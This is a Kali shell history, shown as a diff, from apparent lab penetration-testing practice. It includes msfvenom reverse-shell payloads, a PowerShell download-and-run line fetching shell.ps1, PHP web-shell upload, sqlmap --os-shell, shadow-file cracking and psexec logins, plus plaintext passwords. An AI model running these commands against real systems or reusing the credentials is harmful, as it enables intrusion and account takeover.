@@ -1,0 +1,999 @@
+  172  sudo apt-get install pip
+  177  sudo apt-get install libssl-dev
+  183  pip3 install pycurl==7.43.0.5 --global-option="--with-nss" --upgrade
+  184  pip install pycurl --global-option="--with-openssl"
+  189  net
+  192  cd home/kali
+  195  rm Nettacker
+  196  del Nettacker
+  197  rmdir Nettacker
+  203  Nettacker
+  206  sudo rmdir Nettacker
+  207  sudo rmdir -f  Nettacker
+  208  sudo rmdir --hlep
+  209  sudo rmdir --help
+  210  nettacke4
+  216  git clone https://github.com/OWASP/Nettacker.git && cd Nettacker && pip install -r requirements.txt && python setup.py install
+  217  sudo git clone https://github.com/OWASP/Nettacker.git && cd Nettacker && pip install -r requirements.txt && python setup.py install
+  218  python
+  221  sudo requirements.txt
+  222  sudo vi requirements.txt
+  223  pip install -r requirements.txt && python setup.py install
+  224  sudo pip install -r requirements.txt && python setup.py install
+  225  sudo apt search python-is-python2
+  230  pip install -r requirements.txt && python setup.py install 
+  231  sudo pip install -r requirements.txt && python setup.py install 
+  233  sudo pip install -r requirements.txt
+  236  vi setup.py
+  237  python setup.py
+  238  python setup.py install
+  240  nettracker
+  245  nettacker help
+  246  nettacker --version
+  250  sudo rmdir build -f
+  251  sudo rmdir -f  build 
+  252  rmdir --help
+  255  sudo rmdir build --ignore-fail-on-non-empty
+  258  cat readme.md
+  259  pip install setup-tools
+  260  pip install setuptools
+  261  sudo python setup.py uninstall
+  262  rmdir build
+  263  sudo rmdir build
+  264  sudo pip2 install setuptools
+  265  sudo pip2 install -r requirements.txt
+  267  sudo apt install python-dev python3-dev libssl-dev libcurl4-openssl-dev  libpq-dev 
+  269  python3 nettacker.py 
+  270  sudo python3 nettacker.py 
+  271  sudo python3 nettacker.py  10.10.10.29
+  272  sudo python3 nettacker.py  https://10.10.10.29
+  273  sudo python3 nettacker.py -i https://10.10.10.29
+  274  sudo python3 nettacker.py -i https://10.10.10.29 -m wordpress_dos_cve_2018_6389_vuln
+  280  cd Nettacker
+  282  /home/kali/Nettacker/Nettacker/.data/results/results_2021_08_05_17_19_34_dlxzqwrcln.html
+  283  sudo /home/kali/Nettacker/Nettacker/.data/results/results_2021_08_05_17_19_34_dlxzqwrcln.html
+  285  python2 nettacker
+  286  python2 nettacker.py
+  287  sudo python3 nettacker.py -i http://10.10.10.29 -m wordpress_dos_cve_2018_6389_vuln
+  288  sudo python3 nettacker.py -i http://10.10.10.29 -m wordpress_version_scan
+  289  sudo apt-get --purge remove netstat
+  290  locate netstat
+  291  sudo apt-get --purge remove Nettacker
+  292  sudo apt-get  remove Nettacker
+  300  vi requirements.txt
+  301  cat requirements.txt
+  302  sudp apet-get install python-dev
+  303  sudp apt-get install python-dev
+  304  sudo apt-get install python-dev
+  306  sudo apt-get install pkgconfig
+  307  sudo apt-get install openssl-dev
+  308  sudo apt-get install python3-dev
+  309  sudo apt-get install libpq-dev
+  311  sudo apt-get install python-pip python-dev build-essential 
+  312  sudo pip install --upgrade pip 
+  313  pip install --upgrade pip
+  314  nettacker
+  316  sudo apt install python3-pip
+  317  sudo apt install python2-pip
+  318  wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
+  319  sudo python2.7 get-pip.py
+  320  sudo apt install python-dev
+  321  sudo apt install libssl-dev
+  322  sudo apt install libcurl4-openssl-dev
+  323  sudo apt install libpq-dev 
+  324  sudo apt-get remove netstat
+  325  sudo apt-get remove nettacker
+  330  sudo reni777(1).ovpn
+  331  sudo openvpn reni777(1).ovpn
+  333  ping google.co,
+  340  kill -9 143817
+  341  netstat -ctnp
+  348  pip3 install kerbrute
+  349  sudo pip3 install kerbrute
+  351  kerbrute -h
+  352  kerbrute
+  355  smbclient -L \\\\10.10.133.213
+  356  smbclient -L \\\\10.10.133.213\\ -U ''
+  360  nmap -sS -A 10.10.133.213 -v
+  361  sudo nmap -sS -A 10.10.133.213 -v
+  362  sudo nmap -sS -A 10.10.133.213 
+  363  ping 10.10.133.213
+  364  enum4linux -a 10.10.133.213
+  365  rdesktop -u TCM -p Hacker123
+  366  rdesktop -u TCM -p Hacker123 10.10.133.213
+  367  sudo rdesktop -u TCM -p Hacker123 10.10.133.213
+  369  msfvenom -p windows/meterpreter/reverse_tcp lhost=10.17.17.38 -f exe -o program.exe
+  372  kill -9 143634
+  375  nc -lvnp 4444
+  377  terminfo 
+  379  sudo nmap -sS 10.10.10.46
+  381  nc http://10.10.10.46
+  384  nc 10.10.10.46 80
+  385  sudo nmap -sS -A 10.10.10.46
+  390  xterm-256color
+  391  configure 
+  392  vi ~/.profile
+  393  vi ~/.zhrc
+  394  vi /.zshrc\n
+  395  vi ~/.zshrc\n
+  397  setenv TERM xterm-256color
+  402  openvpn -help
+  403  openvpn --help
+  405  ping 10.10.10.29
+  409  wpscan 10.10.10.29
+  410  wpscan https//10.10.10.29
+  411  wpscan http://10.10.10.29
+  412  wpscan --help
+  413  wpscan 10.10.10.29:80
+  414  wpscan --url http://10.10.10.29
+  415  wpscan --url http://10.10.10.29/
+  416  wpscan --url http://10.10.10.29:80/
+  417  wpscan --url http://10.10.10.29/wordpress/
+  418  wpscan --url http://10.10.10.29/wordpress/ --ignore-main-redirect
+  419  wpscan --url http://10.10.10.29/wordpress/ --ignore-main-redirect --enumerate users
+  420  wpscan --url http://10.10.10.29/wordpress/ --ignore-main-redirect --enumerate user
+  421  wpscan --url http://10.10.10.29/wordpress/ --ignore-main-redirect --enumerate u
+  423  nmap 10.10.10.27
+  424  sqlmap 10.10.10.27
+  425  sqlmap -u 10.10.10.27
+  426  sqlmap -u http://10.10.10.27
+  427  mysqlshow -h
+  428  mysqlshow 
+  429  mysql
+  430  mysqlcheck 
+  431  mysqlcheck --help
+  433  python3 sqlmap -u 10.10.10.27 --os-spawn
+  434  sudo python sqlmap -u 10.10.10.27 --os-spawn
+  435  sqlmap -u 10.10.10.27 --os-spawn
+  437  rm requirements.txt
+  440  vi ~/zshrc
+  441  vi ~/.zshrc
+  449  wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/impacket/ImpactPacket.py
+  451  rm ImpactPacket.py
+  452  wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
+  454  mssqlclient.py ARCHETYPE\sql_svc@10.10.10.27 -windows-auth
+  456  git clone https://github.com/SecureAuthCorp/impacket
+  458  sudo    python setup.py install
+  463  python mssqlclient.py ARCHETYPE\sql_svc@10.10.10.27 -windows-auth
+  464  python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+  466  $ infocmp | grep colors
+  467  infocmp | grep colors
+  468  echo $TERM
+  469  infocmp | head -n 4
+  473  smbclient -L \\\\10.10.10.27
+  474  smbclient -L \\\\10.10.10.27\backups
+  475  smbclient  \\\\10.10.10.27\backups
+  476  smbclient  -N \\\\10.10.10.27\backups
+  477  smbclient  -N \\\\10.10.10.27\\backups
+  479  cat prod.dtsConfig
+  485  cd Do
+  490  kill -9 148774
+  491  python3 -m http.server 80\n
+  492  python3 -m http.server 8080\n
+  493  dier
+  494  dir
+  498  python mssqlclient.py ARCHETYPE\sql_svc@10.10.10.27
+  499  python mssqlclient.py ARCHETYPE\sql_svc@10.10.10.27 -linux-auth
+  500  python mssqlclient.py -h
+  516  xp_cmdshell 'powershell "IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.43:8080/shell.ps1\")"'
+  525  sudo apt-get install ufw
+  527  sudo ufw enable
+  529  ufw allow from 10.10.10.27 proto tcp to any port 80,443\n
+  530  sudo ufw allow from 10.10.10.27 proto tcp to any port 80,443\n
+  532  sudo ufw disable
+  534  nc -lvnp 443\n
+  542  rm shell.ps1
+  549  kill -9 149488
+  550  python3 -m http.server 8080
+  551  python3 -m http.server 8
+  554  pkill http.server
+  557  kill -9 213360
+  558  python3 -m http.server 80
+  561  kill -9 280114
+  563  rdesktop -u administrator -p MEGACORP_4dm1n.10.10.27
+  564  nmap -sS -A 10.10.10.27 -v
+  565  sudo nmap -sS -A 10.10.10.27 -v
+  566  rdesktop -u administrator -p MEGACORP_4dm1nsudo nmap -sS -A 10.10.10.27 -v 10.10.10.27
+  567  sudo rdesktop -u administrator -p MEGACORP_4dm1nrdesktop -u administrator -p MEGACORP_4dm1nsudo nmap -sS -A 10.10.10.27 -v 10.10.10.27 10.10.10.27
+  568  rdesktop
+  570  ping 10.10.10.27
+  571  python mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth\n
+  572  nc -lvnp 443
+  575  cat shell.ps1
+  576  wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py
+  578  python psexec.py administrator@10.10.10.27
+  580  psexec.py administrator;MEGACORP_4dm1npsexec.py
+  581  psexec.py administrator@10.10.10.27:MEGACORP_4dm1npsexec.py administrator;MEGACORP_4dm1npsexec.py
+  582  psexec.py administrator:MEGACORP_4dm1npsexec.py administrator@10.10.10.27:MEGACORP_4dm1npsexec.py administrator;MEGACORP_4dm1npsexec.py@10.10.10.27
+  585  sudo nc -lvnp 443
+  587  vi shell.ps1
+  588  psexec.py administrator@10.10.10.27
+  590  sudo python3 -m http.server 80
+  592  nc 10.10.10.28 80
+  593  python mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
+  596  cat user.txt
+  597  rm user.txt
+  598  rm root.txt
+  600  cat root.txt
+  601  nmap -sS -A 10.10.10.28 -v
+  602  sudo nmap -sS -A 10.10.10.28 -v
+  603  burpsuite
+  606  kill -9 295412
+  607  kill -9 295386
+  609  netsat -ltnp
+  611  kill -9 305156
+  615  nc -lvnp 1234
+  619  git clone https://github.com/maurosoria/dirsearch.git\n
+  620  cd dirsearch
+  621  sudo python3 dirsearch.py -u http://10.10.10.28 -e php
+  622  locate php-reverse-sehll
+  623  locate php-reverse-shell
+  624  cd /usr/share/webshells/php/php-reverse-shell.php
+  625  cp /usr/share/webshells/php/php-reverse-shell.php test.php
+  627  cat test.php
+  628  ifconfi
+  630  vi test.php
+  632  vi ./forloop.sh
+  633  ./forloop.sh
+  634  curl http://10.10.10.28/uploads/test.php\n
+  635  sudo curl http://10.10.10.28/uploads/test.php\n
+  638  cd Downloads
+  642  openvpn HackTheBox.ovpn
+  643  sudo openvpn HackTheBox.ovpn
+  661  ./ loop.sh
+  662  ./loop.sh
+  663  sudo ./loop.sh
+  664  sudo .\loop.sh
+  665  sudo loop.sh
+  666  loop.sh
+  669  vi loop.sh
+  670  bash loop.sh
+  671  nmap -sS -A 10.10.10.46 -v
+  672  sudo nmap -sS -A 10.10.10.46 -v
+  673  ftp 10.10.10.46
+  676  zip2john backup.zip >hash
+  680  vi hash
+  682  sudo zip2john backup.zip > hash
+  685  john hash --fork=4 -w=/home/kali/hash
+  686  locate rockyou
+  687  john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt.gz
+  688  cd /usr/share/wordlists/rockyou.txt.gz
+  689  cd /usr/share/wordlists/
+  691  unzip rockyou.txt.gz
+  692  cd rockyou.txt.gz
+  693  cd ./rockyou.txt.gz
+  694  gzip -d rockyou.txt.gz
+  695  sudo gzip -d rockyou.txt.gz
+  700  john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt --show
+  701  unzip backup.zip
+  705  zip2john backup.zip hash2
+  706  zip2john backup.zip > hash2
+  708  john hash2 
+  709  locate rockyou.txt
+  710  john hash2 -w=/usr/share/wordlists/rockyou.txt
+  712  john hash2 --fork=4 -w=usr/share/wordlists/rockyou.txt
+  713  john hash --fork=4 -w=usr/share/wordlists/rockyou.txt
+  717  sudo john --help
+  718  sudo john hash2 -w=/usr/share/wordlists/rockyou.txt
+  725  sudo john hash2 --fork=4 -w=/usr/share/wordlists/rockyou.txt
+  726  cp hash2 hash3
+  727  sudo john hash3  -w=/usr/share/wordlists/rockyou.txt
+  728  sudo john hash3 --fork=4 -w=/usr/share/wordlists/rockyou.txt
+  729  cat hash2
+  730  rm hash
+  731  rm hash2
+  732  rm hash3
+  734  zip2john backup.zip > hash
+  736  sudo john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
+  739  john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
+  740  john hash --fork=3 -w=/usr/share/wordlists/rockyou.txt
+  743  john /home/kali/hash --fork=3 -w=/usr/share/wordlists/rockyou.txt
+  745  john zip2john backup.zip > backup.hash
+  746  john .zip2john backup.zip > backup.hash
+  747  zip2john backup.zip > backuphash.txt
+  748  john backuphash.txt
+  750  john backuphash.txt --show
+  751  john hash.txt --show
+  752  john hash --show
+  759  sudo sqlmap 'http://10.10.10.46/dashboard.php?search=a' --cokie="PHPSESSID=mii4l429dmm3qvppgno7cs1tl7"
+  760  sudo sqlmap 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=mii4l429dmm3qvppgno7cs1tl7"
+  763  sudo sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=mii4l429dmm3qvppgno7cs1tl7"
+  764  cat /root/.local/share/sqlmap/output/10.10.10.46
+  765  sudo cat /root/.local/share/sqlmap/output/10.10.10.46
+  766  sudo cd /root/.local/share/sqlmap/output/10.10.10.
+  767  sudo cd /root/.local/share/sqlmap/output/10.10.10.46
+  769  cd /root/.local/share/sqlmap/output/10.10.10.46/
+  770  sudo cd /root/.local/share/sqlmap/output/10.10.10.46/
+  771  sudo cd /root/.local/share/sqlmap/output/
+  773  sudo sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=mii4l429dmm3qvppgno7cs1tl7" --os-shell
+  775  sqlmap --help
+  776  sudo sqlmap --flush-session
+  777  sudo sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --flush-session
+  778  sudo sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=mii4l429dmm3qvppgno7cs1tl7" --os-shell --no-cast
+  779  sudo sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=mii4l429dmm3qvppgno7cs1tl7" --os-shell --no-cast --risk=3
+  782  ufw enab;e
+  783  ufw enable
+  784  udo ufw start
+  785  udo ufw status
+  787  sudo ufw start
+  789  sudo ufw enable 
+  791  show ufw status
+  795  sudo ufw from 192.168.1.1 to 192.168.1.10 port 22
+  796  sudo ufw from 192.168.1.1 to 192.168.1.10 22
+  797  sudo ufw from 192.168.1.1 to 192.168.1.10 on 22
+  798  show ufw status numbered
+  800  sudo delete rule 1
+  801  sudo ufw delete rule 1
+  805  sudo ufw allow from 192.168.1.1 to 192.168.1.10 port 22
+  807  vi username.txt
+  808  hydra -l reni -p Pass@123
+  809  hydra -l reni -p Pass@123 https://192.168.1.1 -t 4 -V
+  810  subist3r
+  812  smbclient -N -L \\\\192.168.1.1
+  813  sudo smbclient -N -L \\\\192.168.1.1
+  814  sudo smbclient -N -L \\\\192.168.1.1\\ 
+  818  sudo nc -lvnp 4444
+  819  locate wordlist
+  822  sudo sqlmap -u 'http://10.10.10.46/dashboard.php?search=test' --cookie="PHPSESSID=mii4l429dmm3qvppgno7cs1tl7" --os-shell --no-cast --risk=3
+  823  sudo sqlmap -u 'http://10.10.10.46/dashboard.php?search=test' --cookie="PHPSESSID=mii4l429dmm3qvppgno7cs1tl7" --os-shel
+  824  sudo sqlmap -u 'http://10.10.10.46/dashboard.php?search=test1' --cookie="PHPSESSID=mii4l429dmm3qvppgno7cs1tl7" --os-shel
+  825  sudo sqlmap -u 'http://10.10.10.46/dashboard.php?search=t1' --cookie="PHPSESSID=qelfs5o8q0uod6li7rpqd7fog0"
+  826  sudo sqlmap -u 'http://10.10.10.46/dashboard.php?search=t1' --cookie="PHPSESSID=qelfs5o8q0uod6li7rpqd7fog0" --risk=3
+  827  sudo sqlmap -u 'http://10.10.10.46/dashboard.php?search=t' --cookie="PHPSESSID=qelfs5o8q0uod6li7rpqd7fog0" --os-shell --risk=3
+  828  sudo sqlmap -u 'http://10.10.10.46/dashboard.php?search=t' --cookie="PHPSESSID=qelfs5o8q0uod6li7rpqd7fog0" --os-shell --risk=3 --random-agent
+  829  ping 10.10.10.46
+  830  sudo sqlmap -u 'http://10.10.10.46/dashboard.php?search=t' --cookie="PHPSESSID=qelfs5o8q0uod6li7rpqd7fog0"
+  831  sudo sqlmap -u 'http://10.10.10.46/dashboard.php?search=t' --cookie="PHPSESSID=qelfs5o8q0uod6li7rpqd7fog0" --os-shell
+  832  nmap -sS -A 10.10.10.29 -v
+  833  sudo nmap -sS -A 10.10.10.29 -v
+  834  sudo dirb -u http://10.10.10.29 -w=/usr/share/dirb/wordlists/common.txt
+  835  sudo dirb -u http://10.10.10.29 -w='/usr/share/dirb/wordlists/common.txt'
+  836  sudo dirb -u http://10.10.10.29 -w '/usr/share/dirb/wordlists/common.txt'
+  837  sudo gobuster dir -u http://10.10.10.29 -w '/usr/share/dirb/wordlists/common.txt'
+  838  sudo ufw status ver bose
+  839  sudo ufw status verbose
+  842  kill -9 436753
+  843  run
+  845  nmap -A 192.168.1.1
+  847  ssh 192.168.1.1 135
+  848  nmap 192.168.1.1
+  852  ufw status
+  854  sudo ufw allow from 192.168.1.1 192.168.1.10 ssh
+  855  sudo ufw allow from 192.168.1.1 to 192.168.1.10
+  856  sudo ufw allow from 192.168.1.1 to 192.168.1.10 ssh
+  857  sudo ufw allow from 192.168.1.1 to 192.168.1.10 22
+  858  sudo ufw --help
+  862  sudo /etc/network/interfaces
+  863  sudo vi /etc/network/interfaces
+  864  sudo vi /etc/network/interfaces.d
+  866  sudo ifconfig eth0
+  878  sudo ifconfig etho down
+  879  sudo ifconfig eth0 down
+  880  sudo ifconfig eth0 up
+  883  ifconfig eth0
+  884  ifconfig eth0 de
+  885  ifconfig eth0 help
+  886  ifconfig eth0 
+  890  route -n
+  895  traceroute 8.8.8.8
+  911  ping 192.168.10.1
+  912  ssh 192.168.10.1
+  913  ssh admin@192.168.10.1
+  915  ssh 192.168.1.15
+  923  traceroute 192.168.1.1
+  924  traceroute 192.168.1.15
+  927  sudo ufw allow from 192.168.1.1 to 192.168.10.10 22
+  928  sudo ufw allow from 192.168.1.1 to 192.168.10.10
+  930  sudo ufw allow from 192.168.1.1 to 192.168.10.10 port 22
+  931  sudo ufw statu
+  933  sudo ufw status numbered
+  934  sudo ufw delete 1
+  935  sudo ufw delete 2
+  937  smbclient -N -L \\\\192.168.10.15
+  938  nmap 192.168.10.15 -sS -A
+  939  sudo nmap 192.168.10.15 -sS -A
+  942  nikto -h 192.168.10.15
+  943  wget https://raw.githubusercontent.com/aboul3la/Sublist3r/master/sublist3r.py
+  945  sublist3r.py --help
+  946  python sublist3r.py --help
+  948  git clone https://github.com/aboul3la/Sublist3r.git
+  950  cd Sublist3r
+  952  python sublist3r.py -h
+  953  python sublist3r.py 192.168.10.15
+  954  python sublist3r.py -d 192.168.10.15
+  955  python sublist3r.py -d 192.168.10.15 
+  960  nmap 192.168.10.1
+  961  ping 192.168.10.2
+  962  nmap 192.168.10.15
+  965  ping 192.168.20.15
+  966  nmap 192.168.20.15
+  969  kill openvpn
+  970  kill -p openvpn
+  973  netstat -etnp
+  974  pkill openvpn
+  975  sudo pkill openvpn
+  980  nmap -A 192.168.1.11
+  981  nmap -A -Pn 192.168.1.11
+  982  nmap -A -P- 192.168.1.11
+  983  nmap -A -p- 192.168.1.11
+  984  nmap -A -Pn -p- 192.168.1.11
+  985  ping 192.168.1.15
+  989  ping 192.168.10.11
+  990  nmap -A 192.168.30.11
+  991  ping 192.168.30.11
+  994  ping 192.168.30.101
+  995  ping 192.168.1.11
+  996  nmap 192.168.1.11
+  999  smbclient -N -L \\\\192,168.1.12
+ 1000  msfconsole
+ 1001  sudo ufw status
+ 1002  sudo ufw allow from 192.168.1.1 to 192.168.1.20 port 22
+ 1003  locate hash
+ 1005  locate ta/wordlists/named_pipes.txt
+ 1006  cat /usr/share/metasploit-framework/data/wordlists/named_pipes.txt
+ 1008  smbclient -L \\192.168.1.12
+ 1009  smbclient -L -N \\192.168.1.12
+ 1010  smbclient -L -N \\\\192.168.1.12
+ 1012  smbclient -L \\\\192.168.1.12\\ 
+ 1015  smbclient -U reni -L \\\\192.168.1.12\\oscp
+ 1018  locate users.txt
+ 1020  cd /usr/local/bin/kerbrute
+ 1022  cat /etc/hosts
+ 1023  git clone https://github.com/SecureAuthCorp/impacket.git
+ 1027  python3 -m pip install .
+ 1029  pip3 install requirements.txt
+ 1032  sudo pip3 install requirements.txt
+ 1033  sudo pip3 install -r requirements.txt
+ 1034  pip3 install -r requirements.txt
+ 1035  impacket
+ 1041  kerbrute -user Administrator -password Wipro@0418 -domain oscp -dc-ip 192.168.1.12
+ 1043  cat kerbout.txt
+ 1044  kerbrute -user Administrator -password Wipro@0418 -domain oscp -dc-ip 192.168.1.12 -outputfile kerbout.txt
+ 1045  kerbrute -user Administrator -password Wipro@0418  -dc-ip 192.168.1.12 -outputfile kerbout.txt
+ 1046  kerbrute -user Administrator -password Wipro@0418  -domain oscp.local -dc-ip 192.168.1.12 -outputfile kerbout.txt
+ 1048  kerbrute -user Administrator -passwords /usr/share/seclists/Passwords/cirt-default-passwords.txt  -domain OSCP -dc-ip 192.168.1.12 -outputfile kerbout.txt
+ 1049  kerbrute -user Administrator -password "Wipro@0418"  -domain OSCP -dc-ip 192.168.1.12 -outputfile kerbout.txt
+ 1050  kerbrute -user Administrator -password Wipro@0418 -domain OSCP -dc-ip 192.168.1.12 -outputfile kerbout.txt
+ 1051  kerbrute -user Administrator -d OSCP -dc-ip 192.168.1.12 
+ 1052  kerbrute -user Administrator -domain OSCP -dc-ip 192.168.1.12 
+ 1053  kerbrute -user Administrator -domain OSCP -dc-ip 192.168.1.12 Wipro@0418
+ 1054  kerbrute -user Administrator -domain OSCP -dc-ip 192.168.1.12 -password Wipro
+ 1055  kerbrute -user Administrator -domain OSCP -dc-ip 192.168.1.12 -password Wipro@0418
+ 1056  kerbrute ?
+ 1057  kerbrute -user Administrator -domain OSCP.local -dc-ip 192.168.1.12 -password Wipro@0418
+ 1058  locate kerbrute
+ 1059  python kerbrute -user Administrator -domain OSCP.local -dc-ip 192.168.1.12 -password Wipro@0418
+ 1060  sudo kerbrute -user Administrator -domain OSCP.local -dc-ip 192.168.1.12 -password Wipro@0418
+ 1061  get
+ 1062  GetNPUsers.py
+ 1063  python GetNPUsers.py oscp.local
+ 1064  python GetNPUsers.py oscp
+ 1065  python GetNPUsers.py oscp.local/Administrator
+ 1066  python GetNPUsers.py oscp.local/Administrator -no-pass
+ 1068  python GetNPUsers.py -dc-ip  192.168.1.12
+ 1069  python2 GetNPUsers.py -dc-ip  192.168.1.12
+ 1070  GetNPUsers.py -dc-ip  192.168.1.12
+ 1071  GetNPUsers.py -dc-ip  192.168.1.12 oscp.local
+ 1072  GetNPUsers.py -dc-ip  192.168.1.12 192.168.1.12
+ 1073  GetNPUsers.py -dc-ip  192.168.1.12 -no-pass
+ 1075  GetNPUsers.py -dc-ip  192.168.1.12 oscp/Administrator Wipro@0418
+ 1076  GetNPUsers.py -dc-ip  192.168.1.12 -k
+ 1077  GetNPUsers.py -dc-ip  192.168.1.12 -k 192.168.1.12
+ 1078  GetNPUsers.py -dc-ip  192.168.1.12 oscp/Administrator -no-pass
+ 1079  GetNPUsers.py -dc-ip  192.168.1.12 oscp/guest -no-pass
+ 1086  psexec.py
+ 1087  psexec.py -target-ip 192.168.1.12
+ 1088  psexec.py -target-ip 192.168.1.12/:Guest
+ 1089  psexec.py  192.168.1.12/:Guest
+ 1090  psexec.py  192.168.1.12/:Guest -no-pass
+ 1091  psexec.py  192.168.1.12/Guest -no-pass
+ 1092  psexec.py  Guest@192.168.1.12 -no-pass
+ 1093  psexec.py Administrator@192.168.1.12 -no-pass
+ 1096  cat /usr/share/seclists/Passwords/Default-Credentials/oracle-ebs-userlist.txt
+ 1097  locate password
+ 1098  cat /usr/share/seclists/Passwords/cirt-default-passwords.txt
+ 1099  /etc/passwd
+ 1100  sudo  cat /etc/passwd
+ 1101  cat /etc/shadow 
+ 1102  sudo cat /etc/shadow 
+ 1147  cat hash
+ 1149  cat backuphash.txt
+ 1151  john hash2 --fork=4 -w=/usr/share/wordlists/rockyou.txt
+ 1153  vi hash2.txt
+ 1154  john hash2.txt --fork=4 -w=/usr/share/wordlists/rockyou.txt
+ 1155  unshadow /etc/passwd /etc/shadow > unshadowed.txt
+ 1156  sudo unshadow /etc/passwd /etc/shadow > unshadowed.txt
+ 1158  cat unshadowed.txt
+ 1159  john unshadow.txt --fork=4 -w=/usr/share/wordlists/rockyou.txt
+ 1160  john unshadowed.txt --fork=4 -w=/usr/share/wordlists/rockyou.txt
+ 1161  sudo unshadow /etc/passwd /etc/shadow > unshadowed.db
+ 1162  john unshadowed.db
+ 1163  sudo unshadow /etc/passwd /etc/shadow > crack.password.db
+ 1164  john crack.password.db
+ 1167  sudo vi /etc/ssh/sshd_config
+ 1168  cat /etc/fail2ban/jail.local
+ 1170  hashcat -help
+ 1172  /etc/pam.d/common-password 
+ 1174  cd /etc/pam.d/
+ 1176  cat passwd
+ 1178  vi cat /etc/pam.d/common-password 
+ 1179  vi /etc/pam.d/common-password 
+ 1181  sudo cat /etc/pam.d/common-password 
+ 1182  sudo vi /etc/pam.d/common-password 
+ 1183  sudo vi /etc/shadow
+ 1185  chage -d 0 kali
+ 1186  sudo chage -d 0 kali
+ 1187  chage -l kali
+ 1188  cat /etc/shadow
+ 1189  sudo cat /etc/shadow
+ 1191  cat /usr/share/john/password.lst
+ 1192  cat /usr/share/john/password.lst | grep Pass
+ 1193  netsta -ltnp
+ 1195  kill -l
+ 1196  kill 4444
+ 1199  netstat -ltnp
+ 1200  lsof -i :4444
+ 1201  sudo lsof -i :4444
+ 1202  kill 1027829
+ 1203  sudo kill 1027829
+ 1205  sudo psexec.py reni:oscp@192.168.1.12
+ 1206  psexec.py Administrator:Wipro@0418@192.168.1.12
+ 1207  psexec.py reni:oscp@192.168.1.12
+ 1208  enum4linux -a 192.168.1.12
+ 1214  locate msfpayload
+ 1215  msfpayload -p windows/meterpreter/reverse_tcp LHOST=192.168.1.20 LPORT=4444 X > smb_rev.exe
+ 1216  cd /usr/share/framework2/msfpayload
+ 1219  cd /usr/share/framework2/
+ 1221  msfpayload -p windows/meterpreter/reverse_tcp LHOST=192.168.1.20 LPORT=4444 X > smb_rev.exe\n
+ 1222  sudo msfpayload -p windows/meterpreter/reverse_tcp LHOST=192.168.1.20 LPORT=4444 X > smb_rev.exe\n
+ 1230  locate impacket-master
+ 1231  locate msfvenom
+ 1232  msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.20 -f exe -o smb_rev.exe\n
+ 1237  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.20 LPORT=4444 -f exe -o smb_rev.exe
+ 1241  rm smb_rev.exe
+ 1242  cp ~smb_rev.exe 
+ 1243  cp ~/smb_rev.exe 
+ 1244  cp ~/smb_rev.exe smb_rev.exe
+ 1246  ./smbrelayx.py -h 192.168.1.12 -e ./smb_rev.exe
+ 1247  vi etc/hosts
+ 1251  ping 192.168.1.12
+ 1252  nmap 192.168.1.12
+ 1253  nmap -A 192.168.1.12
+ 1255  smbclient --L \\\\192.168.1.12
+ 1256  smbclient -L \\\\192.168.1.12
+ 1258  smbclient -U 'admin' -P ' ' -L \\\\192.168.1.12
+ 1259  smbclient -U 'admin' -P '' -L \\\\192.168.1.12
+ 1260  smbclient -U admin -P '' -L \\\\192.168.1.12
+ 1261  smbclient -U admin -P ' ' -L \\\\192.168.1.12
+ 1262  smbclient -U admin -P " " -L \\\\192.168.1.12
+ 1263  smbclient -U admin -P " "  \\\\192.168.1.12
+ 1264  smbclient -U admin -L \\\\192.168.1.12
+ 1266  smbclient -U user -L \\\\192.168.1.12
+ 1268  smbclient -U admininstrator -L \\\\192.168.1.12
+ 1269  smbclient -U reni -L \\\\192.168.1.12
+ 1270  smbclient -U reni -P ' '-L \\\\192.168.1.12
+ 1271  smbclient -U reni -N -L \\\\192.168.1.12
+ 1272  smbclient -U reni -N -L \\\\192.168.1.12\\ 
+ 1273  smbclient -U reni -N -L \\\\192.168.1.12\\shares\\ 
+ 1274  smbclient  -N -L \\\\192.168.1.12\\shares
+ 1276  smbclient  -U reni -L \\\\192.168.1.12\\ 
+ 1277  smbclient  -U reni -P -L \\\\192.168.1.12\\ 
+ 1278  smbclient  -U reni -P'' -L \\\\192.168.1.12\\ 
+ 1279  smbclient  -U reni -P '' -L \\\\192.168.1.12\\ 
+ 1280  smbclient  -U reni -P ' ' -L \\\\192.168.1.12\\ 
+ 1281  smbclient  -N -L \\\\192.168.1.12\\ 
+ 1282  smbclient  -N -L \\\\192.168.1.12
+ 1283  smbclient  -N -L 192.168.1.12
+ 1284  smbclient  -N -L 192.168.1.12\\oscp
+ 1285  smbclient  -N -L 192.168.1.12\\OSCP
+ 1286  smbclient  -N -L reni@192.168.1.12\\OSCP
+ 1287  smbclient  -L reni@192.168.1.12\\OSCP
+ 1288  smbclient  -L reni@192.168.1.12
+ 1289  smbclient  -N -L reni@192.168.1.12
+ 1291  searchsploit IIS
+ 1292  searchsploit -x exploits/windows/remote/19033.txt
+ 1296  vi /etc/hosts
+ 1297  sudo vi /etc/hosts
+ 1298  kerbrute -domain oscp.local -user admin
+ 1299  kerbrute -domain oscp.local -user admin -password Wipro@0418
+ 1302  PuTTYPuTTYPuTTYPuTTYPuTTYPuTTYPuTTYPuTTYPuTTYPuTTY
+ 1303  cat admin.ccache
+ 1304  kerbrute --help
+ 1305  kerbrute -domain oscp.local -user admin -password Wipro@0418 -outputfile oscp.txt
+ 1306  cat oscp.txt
+ 1308  cd impacket
+ 1310  cd examples
+ 1312  GetNPUsers.py -dc-ip  192.168.1.12 oscp/Guest -no-pass
